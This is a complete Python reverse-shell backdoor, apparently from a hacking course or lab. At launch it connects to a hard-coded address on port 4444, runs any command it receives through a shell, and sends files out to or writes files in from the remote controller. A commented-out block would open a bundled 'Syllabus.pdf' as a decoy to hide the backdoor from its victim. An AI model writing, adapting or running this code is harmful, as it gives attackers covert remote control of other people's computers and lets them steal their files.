import socket,subprocess,json,os,base64,traceback,sys

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data=json.dumps(data)
        self.connection.send(json_data.encode())


    def reliable_receive(self):
        json_data=b""
        while True:
            try:
                json_data+= self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def read_file(self,path):
        with open(path,"rb") as file:
            return base64.b64encode(file.read())


    def write_file(self,path,content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+]Successfully uploaded"

    def exec_cmd(self,command):
        DEVNULL = open(os.devnull, 'wb')
        return subprocess.check_output(command, shell=True,stderr=DEVNULL,stdin=DEVNULL)

    def change_dir(self, path):
        os.chdir(path)
        print("Current Working Directory ", os.getcwd())
        return "Changing directory to " + path

    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                if command[0]=="exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    if len(command)==3:
                        print(command[2])
                        command_out = self.exec_cmd(command[2]).decode()
                        print(command_out)
                    else:
                        command_out=self.change_dir(command[1])
                elif command[0] == "download":
                    command_out=self.read_file(command[1]).decode()
                elif command[0] == "upload":
                    print(command)
                    command_out=self.write_file(command[1],command[2])
                else:
                    command_out=self.exec_cmd(command).decode()
                #received = received_data.decode()
            except Exception as ex:
                #command_out = template.format(type(ex).__name__, ex.args)
                command_out = traceback.format_exc()
            self.reliable_send(command_out)

'''file=sys._MEIPASS + "\Syllabus.pdf"
subprocess.Popen(file,shell=True)'''

try:
    host=Backdoor("192.168.56.101",4444)
    host.run()
except Exception:
    sys.exit()